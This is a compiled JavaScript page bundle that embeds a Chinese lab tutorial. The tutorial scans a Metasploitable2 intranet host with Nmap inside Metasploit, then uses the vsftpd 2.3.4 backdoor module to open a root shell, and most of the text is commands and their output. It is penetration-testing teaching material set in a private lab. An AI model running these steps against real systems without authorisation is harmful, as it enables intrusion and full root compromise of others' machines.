(window.webpackJsonp=window.webpackJsonp||[]).push([[322],{613:function(s,n,a){"use strict";a.r(n);var e=a(7),t=Object(e.a)({},(function(){var s=this,n=s._self._c;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"使用metasploit中的nmap插件扫描并渗透内网主机"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#使用metasploit中的nmap插件扫描并渗透内网主机"}},[s._v("#")]),s._v(" 使用Metasploit中的NMap插件扫描并渗透内网主机")]),s._v(" "),n("p",[s._v("攻击机： Kali 192.168.175.128")]),s._v(" "),n("p",[s._v("靶机： WinXP 192.168.175.130")]),s._v(" "),n("p",[s._v("内网主机： Metasploitable2 192.168.175.131")]),s._v(" "),n("p",[s._v("在上一篇《"),n("a",{attrs:{href:"https://blog.csdn.net/l1028386804/article/details/86607498",target:"_blank",rel:"noopener noreferrer"}},[s._v("Metasploit实战三之——使用Metasploit获取目标的控制权限"),n("OutboundLink")],1),s._v("》一文中，我们已经拿下了靶机的控制权限，并通过arp命令得知：内网中有一台IP为192.168.175.131的主机。接下来，我们首先使用NMap对这个主机进行扫描。")]),s._v(" "),n("h3",{attrs:{id:"开启msf终端"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#开启msf终端"}},[s._v("#")]),s._v(" 开启MSF终端")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("msfconsole\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("h3",{attrs:{id:"扫描内网主机"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#扫描内网主机"}},[s._v("#")]),s._v(" 扫描内网主机")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("nmap -sV 192.168.175.131\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v("结果如下：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("msf5 > nmap -sV 192.168.175.131\n[*] exec: nmap -sV 192.168.175.131\n\nStarting Nmap 7.70 ( https://nmap.org ) at 2019-01-23 12:28 CST\nNmap scan report for 192.168.175.131\nHost is up (0.0029s latency).\nNot shown: 977 closed ports\nPORT     STATE SERVICE     VERSION\n21/tcp   open  ftp         vsftpd 2.3.4\n22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)\n23/tcp   open  telnet      Linux telnetd\n25/tcp   open  smtp        Postfix smtpd\n53/tcp   open  domain      ISC BIND 9.4.2\n80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)\n111/tcp  open  rpcbind     2 (RPC #100000)\n139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n512/tcp  open  exec        netkit-rsh rexecd\n513/tcp  open  login       OpenBSD or Solaris rlogind\n514/tcp  open  tcpwrapped\n1099/tcp open  rmiregistry GNU Classpath grmiregistry\n1524/tcp open  bindshell   Metasploitable root shell\n2049/tcp open  nfs         2-4 (RPC #100003)\n2121/tcp open  ftp         ProFTPD 1.3.1\n3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5\n5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7\n5900/tcp open  vnc         VNC (protocol 3.3)\n6000/tcp open  X11         (access denied)\n6667/tcp open  irc         UnrealIRCd\n8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)\n8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1\nMAC Address: 00:0C:29:CF:F6:AC (VMware)\nService Info: Hosts:  metasploitable.localdomain, localhost, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.57 seconds\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br")])]),n("p",[s._v("这里，我们利用 vsftpd 2.3.4的漏洞来攻破内网主机。")]),s._v(" "),n("h3",{attrs:{id:"利用利用-vsftpd-2-3-4的漏洞来攻破内网主机"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#利用利用-vsftpd-2-3-4的漏洞来攻破内网主机"}},[s._v("#")]),s._v(" 利用利用 vsftpd 2.3.4的漏洞来攻破内网主机")]),s._v(" "),n("h4",{attrs:{id:"搜索vsftpd-2-3-4漏洞"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#搜索vsftpd-2-3-4漏洞"}},[s._v("#")]),s._v(" 搜索vsftpd 2.3.4漏洞")]),s._v(" "),n("p",[s._v("这里，使用search vsftpd 2.3.4命令，如下：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("msf5 > search vsftpd 2.3.4\n\nMatching Modules\n================\n\n   Name                                                      Disclosure Date  Rank       Check  Description\n   ----                                                      ---------------  ----       -----  -----------\n   auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials\n   exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution\n   exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection\n   exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br")])]),n("h4",{attrs:{id:"准备攻击"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#准备攻击"}},[s._v("#")]),s._v(" 准备攻击")]),s._v(" "),n("p",[s._v("这里，我们依次输入以下命令：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("search vsftpd 2.3.4\nuse exploit/unix/ftp/vsftpd_234_backdoor \nshow options\nset RHOSTS 192.168.175.131\nshow payloads\nset payload cmd/unix/interact \nexploit\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br")])]),n("p",[s._v("具体如下：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("msf5 > search vsftpd 2.3.4\n\nMatching Modules\n================\n\n   Name                                                      Disclosure Date  Rank       Check  Description\n   ----                                                      ---------------  ----       -----  -----------\n   auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials\n   exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution\n   exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection\n   exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution\n\n\nmsf5 > use exploit/unix/ftp/vsftpd_234_backdoor \nmsf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options\n\nModule options (exploit/unix/ftp/vsftpd_234_backdoor):\n\n   Name    Current Setting  Required  Description\n   ----    ---------------  --------  -----------\n   RHOSTS                   yes       The target address range or CIDR identifier\n   RPORT   21               yes       The target port (TCP)\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.175.131\nRHOSTS => 192.168.175.131\nmsf5 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads\n\nCompatible Payloads\n===================\n\n   Name               Disclosure Date  Rank    Check  Description\n   ----               ---------------  ----    -----  -----------\n   cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection\n\nmsf5 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact \npayload => cmd/unix/interact\nmsf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit\n\n[*] 192.168.175.131:21 - Banner: 220 (vsFTPd 2.3.4)\n[*] 192.168.175.131:21 - USER: 331 Please specify the password.\n[+] 192.168.175.131:21 - Backdoor service has been spawned, handling...\n[+] 192.168.175.131:21 - UID: uid=0(root) gid=0(root)\n[*] Found shell.\n[*] Command shell session 1 opened (192.168.175.128:44413 -> 192.168.175.131:6200) at 2019-01-23 14:00:16 +0800\n\nifconfig\neth0      Link encap:Ethernet  HWaddr 00:0c:29:cf:f6:ac  \n          inet addr:192.168.175.131  Bcast:192.168.175.255  Mask:255.255.255.0\n          inet6 addr: fe80::20c:29ff:fecf:f6ac/64 Scope:Link\n          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1\n          RX packets:5408 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:2778 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000 \n          RX bytes:368033 (359.4 KB)  TX bytes:249606 (243.7 KB)\n          Interrupt:19 Base address:0x2000 \n\nlo        Link encap:Local Loopback  \n          inet addr:127.0.0.1  Mask:255.0.0.0\n          inet6 addr: ::1/128 Scope:Host\n          UP LOOPBACK RUNNING  MTU:16436  Metric:1\n          RX packets:766 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:766 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:0 \n          RX bytes:349561 (341.3 KB)  TX bytes:349561 (341.3 KB)\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br"),n("span",{staticClass:"line-number"},[s._v("61")]),n("br"),n("span",{staticClass:"line-number"},[s._v("62")]),n("br"),n("span",{staticClass:"line-number"},[s._v("63")]),n("br"),n("span",{staticClass:"line-number"},[s._v("64")]),n("br"),n("span",{staticClass:"line-number"},[s._v("65")]),n("br"),n("span",{staticClass:"line-number"},[s._v("66")]),n("br"),n("span",{staticClass:"line-number"},[s._v("67")]),n("br"),n("span",{staticClass:"line-number"},[s._v("68")]),n("br"),n("span",{staticClass:"line-number"},[s._v("69")]),n("br"),n("span",{staticClass:"line-number"},[s._v("70")]),n("br"),n("span",{staticClass:"line-number"},[s._v("71")]),n("br"),n("span",{staticClass:"line-number"},[s._v("72")]),n("br")])]),n("p",[s._v("这样，我们就通过NMap扫描目标主机，并通过Metasploit攻击vsftpd 2.3.4漏洞拿下了内网服务器的权限。")]),s._v(" "),n("h2",{attrs:{id:"写在最后"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),n("blockquote",[n("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);n.default=t.exports}}]);